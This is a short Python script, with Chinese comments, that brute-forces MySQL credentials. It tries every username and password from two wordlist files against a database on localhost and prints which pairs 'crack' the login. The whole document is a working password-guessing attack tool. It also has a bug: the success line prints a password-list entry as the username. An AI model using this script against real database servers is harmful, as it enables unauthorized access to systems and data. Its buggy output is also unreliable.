#-*- coding: utf-8 -*-

import pymysql

success = False

f_user = open('username.txt', 'r')
f_pwd = open('password.txt', 'r')

lines_user = f_user.readlines()  # 读取出来是一个列表
lines_pwd = f_pwd.readlines()

for user in range(0, len(lines_user)):  # 遍历用户名列表
    for pwd in range(0, len(lines_pwd)):  # 遍历密码列表
        try:
            db = pymysql.Connect(
                host='localhost',
                port=3306,
                user=lines_user[user].rstrip(),
                passwd=lines_pwd[pwd].rstrip(),
            )
            success = True

            if success:
                print("用户名：" + lines_pwd[user].rstrip() + " " + "密码：" + lines_pwd[pwd].rstrip() + " " + "破解成功")
                success = False

        except:
            print(lines_user[user].rstrip() + " " + lines_pwd[pwd].rstrip() + " " + "破解失败")
            pass

f_user.close()
f_pwd.close()
